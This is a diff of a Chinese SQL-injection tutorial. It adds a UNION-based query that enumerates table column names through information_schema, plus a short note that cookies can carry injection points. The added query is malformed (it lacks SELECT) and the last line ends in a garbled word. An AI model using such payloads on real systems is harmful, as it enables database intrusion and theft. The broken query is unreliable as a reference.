@@ -50,4 +50,11 @@ select table_name from information_schema.tables where table_schema=(select data
 
 ![image.png](../pictures/xw2v7xgqjhk.png)
 
-6. 使用union获取到数据库
+6. 使用union获取到表中的字段
+```sql
+union column_name from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1) limit 0,1
+```
+<img src="../pictures/pxv1xkx5l5.png" width="600" />
+
+## cookie注入
+提到这点，是由于cookie中也可以存在注入点，因此从这个推广开来就可以知道，只要和数据库发生交互的就可以是存在zhu'e
